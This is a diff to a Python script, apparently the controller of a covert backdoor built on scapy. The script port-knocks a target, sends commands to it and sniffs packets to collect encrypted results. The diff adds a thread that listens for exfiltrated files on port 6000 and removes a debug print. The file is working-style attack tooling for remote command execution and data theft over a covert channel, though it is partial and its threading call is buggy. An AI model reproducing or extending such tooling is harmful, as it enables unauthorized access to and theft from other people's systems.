@@ -3,14 +3,18 @@
 import time, configfile, logging, encryption, helpers
 logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
 from scapy.all import *
+from threading import Thread
 
 # flag to determine when to stop reading the results of a command and decrypt everything
 flag = False
 Results = ""
 
 def checkRoot():
-	if(os.getuid() != 0):
-		exit("This program must be run with root. Try Again..")
+    if(os.getuid() != 0):
+        exit("This program must be run with root. Try Again..")
+
+def sniffForFile():
+    sniff(filter='{0} and dst port 6000'.format(configfile.protocol), prn=recvFile)
 
 def portKnock():
     for knock in configfile.knock:
@@ -34,7 +38,6 @@ def recvCommand(packet):
         Results += (dataReceived)
         if packet.haslayer(Raw):
             if packet[Raw].load == configfile.password:
-                print "Got password"
                 flag = True
                 decryptedData = encryption.decrypt(Results, configfile.password)
                 if decryptedData.startswith(configfile.password):
@@ -44,10 +47,16 @@ def recvCommand(packet):
                 print data
                 Results = ""
 
+def recvFile(packet):
+    print "in recvFunc"
+
 def main():
     global flag
     checkRoot()
     portKnock()
+
+    thread = Thread(target=sniffForFile())
+    thread.start()
 
     while 1:
         command = raw_input("Enter command: ")
